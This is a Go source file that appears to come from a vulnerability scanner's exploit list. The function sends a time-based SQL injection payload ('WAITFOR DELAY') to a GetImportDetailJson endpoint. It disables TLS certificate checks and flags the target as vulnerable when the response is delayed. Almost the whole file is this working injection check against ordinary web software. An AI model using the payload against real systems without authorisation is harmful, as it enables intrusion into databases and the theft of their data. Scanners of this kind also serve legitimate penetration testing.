package vulList

import (
	"crypto/tls"
	"fmt"
	"github.com/fatih/color"
	"net/http"
	"time"
)

func GetImportDetailJsonCheck(target string) error {
	baseurl := target + "BaseModule/ExcelImport/GetImportDetailJson?ImportId=1%27%3bWAITFOR+DELAY+%270%3a0%3a5%27--&IsShow=1"
	client := &http.Client{
		Timeout: 10 * time.Second, //超时
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true}, // 禁用证书验证
		},
	}

	startTime := time.Now()

	resp, err := client.Get(baseurl)
	if err != nil {
		return fmt.Errorf("Error sending request: %v", err)
	}

	defer resp.Body.Close()

	duration := time.Since(startTime)

	if duration >= 5*time.Second {
		green := color.New(color.FgGreen)
		green.Println("[+]GetImportDetailJson SQL injection vulnerability")
		fmt.Println()
	} else {
		fmt.Println("[-]GetImportDetailJson SQL injection vulnerability")
		fmt.Println()
	}
	return nil
}
